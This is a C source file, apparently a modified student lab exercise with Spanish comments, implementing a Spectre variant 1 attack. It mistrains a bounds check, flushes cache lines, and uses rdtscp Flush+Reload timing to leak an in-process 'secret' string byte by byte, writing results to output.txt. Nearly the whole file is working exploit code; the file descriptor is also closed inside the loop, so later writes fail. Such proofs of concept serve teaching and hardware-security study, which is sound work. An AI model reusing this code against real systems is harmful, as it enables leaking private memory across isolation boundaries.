#include <emmintrin.h>
#include <x86intrin.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>

unsigned int bound_lower = 0;
unsigned int bound_upper = 9;
uint8_t buffer[10] = {0,1,2,3,4,5,6,7,8,9}; 
uint8_t temp    = 0;
char    *secret = "Some Secret Value";   
uint8_t array[256*4096];

#define CACHE_HIT_THRESHOLD (80)
#define DELTA 1024

// Sandbox Function
uint8_t restrictedAccess(size_t x)
{
  if (x <= bound_upper && x >= bound_lower) {
     return buffer[x];
  } else {
     return 0;
  }
}

void flushSideChannel()
{
  int i;
  // Write to array to bring it to RAM to prevent Copy-on-write
  for (i = 0; i < 256; i++) array[i*4096 + DELTA] = 1;
  //flush the values of the array from cache
  for (i = 0; i < 256; i++) _mm_clflush(&array[i*4096 + DELTA]);
}

static int scores[256];
void reloadSideChannelImproved()
{
int i;
  volatile uint8_t *addr;
  register uint64_t time1, time2;
  int junk = 0;
  for (i = 0; i < 256; i++) {
    addr = &array[i * 4096 + DELTA];
    time1 = __rdtscp(&junk);
    junk = *addr;
    time2 = __rdtscp(&junk) - time1;
    if (time2 <= CACHE_HIT_THRESHOLD)
      scores[i]++; /* if cache hit, add 1 for this value */
  } 
}

void spectreAttack(size_t index_beyond)
{
  int i;
  uint8_t s;
  volatile int z;

  for (i = 0; i < 256; i++)  { _mm_clflush(&array[i*4096 + DELTA]); }

  // Train the CPU to take the true branch inside victim().
  //for (i = 0; i < 10; i++) {
  //  restrictedAccess(i);  
  //} Abajo es el cambio
  for (i = 0; i < 10; i++) {
  	//_mm_clflush(&bound_upper);
  	//_mm_clflush(&bound_lower); 
	for(z = 0; z < 100; z++){ }
	restrictedAccess(i);  
  }

  // Flush bound_upper, bound_lower, and array[] from the cache.
  _mm_clflush(&bound_upper);
  _mm_clflush(&bound_lower); 
  for (i = 0; i < 256; i++)  { _mm_clflush(&array[i*4096 + DELTA]); }
  for (z = 0; z < 100; z++)  {  }
  //
  // Ask victim() to return the secret in out-of-order execution.
  s = restrictedAccess(index_beyond);
  array[s*4096 + DELTA] += 88;
}

// Función para copiar el resultado en un archivo
//void copyOutputToFile(int max, FILE *outputFile) {
//  fprintf(outputFile, "The secret value is %d(%c)\n", max, max);
//}

void copyOutputToFile(int max, int outputFileDescriptor) {
  // Redirige la sialida estándar al archivo
  dup2(outputFileDescriptor, STDOUT_FILENO);
  // Imprime el resultado en la salida estándar (que ahora está redirigida al archivo)
  printf("The secret value is %d(%c)\n", max, max);
}

int main() {

  // Cofig File out (txt)
  //FILE *outputFile = fopen("output.txt", "w");
  //if (outputFile == NULL) {
  //  printf("Error al abrir el archivo de salida.\n");
  //  return 1;
  //}

  int outputFileDescriptor;
  // Abre o crea un archivo de salida
  outputFileDescriptor = open("output.txt", O_CREAT | O_WRONLY | O_TRUNC, 0644);
  if (outputFileDescriptor < 0) {
    perror("Error al abrir el archivo de salida");
    return 1;
  }

  int i;
  uint8_t s;

  // GET ALL Stack
  int buffer_len = 18;
  int buf_counter = 0;
  for (buf_counter = 0; buf_counter < buffer_len; buf_counter++){  
  	size_t index_beyond = (size_t)(secret - (char*)buffer);

  	flushSideChannel();
  	for(i=0;i<256; i++) scores[i]=0; 

  	for (i = 0; i < 1000; i++) {
    		printf("*****\n");  // This seemly "useless" line is necessary for the attack to succeed
    		spectreAttack(index_beyond + buf_counter);
    		usleep(10);
    		reloadSideChannelImproved();
  	}

  	// FIX
  	//if (scores[0] == i, i > 500){
    	//	scores[0] = 0;
  	//}
  	// END FIX
  
  	int max = 1;
  	for (i = 1; i < 256; i++){
    		if(scores[max] < scores[i]) max = i;
  	}

  	//printf("Reading secret value at index %ld\n", index_beyond);
  	//printf("The secret value is %d(%c)\n", max, max);
  	//printf("The number of hits is %d\n", scores[max]);
	
  	//copyOutputToFile(max, outputFile); // Copiar el resultado al archivo
	//
	  copyOutputToFile(max, outputFileDescriptor);

  	// Cierre del archivo
  	close(outputFileDescriptor);
  }
  return (0); 
}
